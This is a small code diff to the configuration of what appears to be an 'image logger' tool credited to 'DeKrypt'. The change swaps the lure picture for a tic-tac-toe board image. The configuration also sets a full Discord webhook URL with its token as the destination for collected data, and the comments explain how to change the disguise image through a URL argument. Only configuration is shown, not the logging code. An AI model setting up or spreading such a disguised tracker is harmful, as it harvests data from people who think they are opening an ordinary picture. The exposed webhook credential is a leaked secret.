@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1105237363808030850/ZNGpRi8anYbCYDH8dyJozCEoYhULIbBgxeIJSit09x4jN6GMEuICGrc5qFhJ-djRva0a",
-    "image": "https://www.google.com/imgres?imgurl=https%3A%2F%2Fi0.wp.com%2Fwww.thegamegal.com%2Fwp-content%2Fuploads%2F2018%2F08%2Fultimate-tic-tac-toe12-01.png%3Fresize%3D340%252C340%26ssl%3D1&tbnid=_thWtOjteu07bM&vet=12ahUKEwjgjbKX1ub-AhWvl4QIHSOJCGAQMygDegUIARD2AQ..i&imgrefurl=https%3A%2F%2Fwww.thegamegal.com%2F2018%2F09%2F01%2Fultimate-tic-tac-toe%2F&docid=bquQ9ACTpeVaKM&w=340&h=340&q=tic%20tac%20toe&ved=2ahUKEwjgjbKX1ub-AhWvl4QIHSOJCGAQMygDegUIARD2AQ", # You can also have a custom image by using a URL argument
+    "image": "https://www.nps.gov/prwi/learn/education/images/Tic-Tac-Toe-Board.JPG?maxwidth=1300&maxheight=1300&autorotate=false", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
